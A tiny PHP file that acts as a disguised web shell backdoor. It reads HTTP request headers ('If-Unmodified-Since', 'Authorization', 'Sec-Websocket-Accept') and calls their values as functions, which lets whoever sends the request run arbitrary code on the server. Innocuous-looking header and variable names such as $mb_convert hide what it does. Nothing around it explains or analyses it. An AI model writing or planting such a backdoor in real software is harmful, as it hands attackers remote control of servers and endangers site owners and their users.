<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Unmodified-Since'])) {
    $mb_convert = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['Authorization']($_HEADERS['Sec-Websocket-Accept']));
    $mb_convert();
}